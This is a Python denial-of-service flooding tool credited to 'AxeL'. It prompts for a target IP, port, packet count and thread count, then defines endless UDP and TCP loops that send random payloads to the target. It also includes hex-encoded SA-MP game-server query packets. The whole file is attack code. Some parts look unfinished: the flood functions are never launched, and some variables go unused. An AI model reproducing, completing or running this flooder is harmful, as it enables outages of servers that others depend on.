#!/usr/bin/env python3
#Code by AxeL
import struct
import time
import random
import socket
import threading
import codecs
import os

os.system("clear")
print("""
\033[94m
   _   _     _              ___  ____  
 | \ | | __| | __ _  __ _ / _ \|  _ \ 
 |  \| |/ _` |/ _` |/ _` | | | | |_) |
 | |\  | (_| | (_| | (_| | |_| |  __/ 
 |_| \_|\__,_|\__,_|\__, |\___/|_|    
                    |___/             
               Tools By AxeL
""")

ip = str(input("\033[95m=====> + IP Target    : "))
port = int(input("=====> + PORT Target  : "))
times = int(input("=====> $ Send PACKETS : "))
threads = int(input("=====> $ Send THREADS : "))
choice = str(input("=====> × Ready? (y/n) : "))
fake_ip = '182.21.20.32'
#Starting Attacking
Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem
                       ]
def run():
	data = random._urandom(1460)
	i = random.choice(("[•]","[!]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[96m AxeLOREZ Send Packets To Ip \033[91m{ip} \033[96mPort \033[91m {port}")
		except:
			print("\033[96m[•] AxeLOREZ Send Packets To Ip \033[91m{ip} \033[96mPort \033[91m {port}")

def run2():
	data = random._urandom(1030)
	i = random.choice(("[•]","[!]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m AxeLOREZ Send Packets To Ip Port\033[92m ==========> {}:{} \u001b[31m".format(ip, port))

		except:
			s.close()
			print("\u001b[31m[•] AxeLOREZ Send Packets To Ip Port\033[92m ==========> {}:{} \u001b[31m".format(ip, port))
            

def run3():
	data = random._urandom(16)
	i = random.choice(("[•]","[!]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m AxeLOREZ Send Packets To Ip Port\033[92m ==========> {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("\u001b[31m[•] AxeLOREZ Send Packets To Ip Port\033[92m ==========> {}:{} \u001b[31m".format(ip, port))
            
  
def run4():
	data = random._urandom(17)
	i = random.choice(("[+]","[!]","[•]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\u001b[31m AxeLOREZ Send Packets To Ip Port\033[92m ==========> {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("\u001b[31m[•] AxeLOREZ Send Packets To Ip Port\033[92m ==========> {}:{} \u001b[31m".format(ip, port))
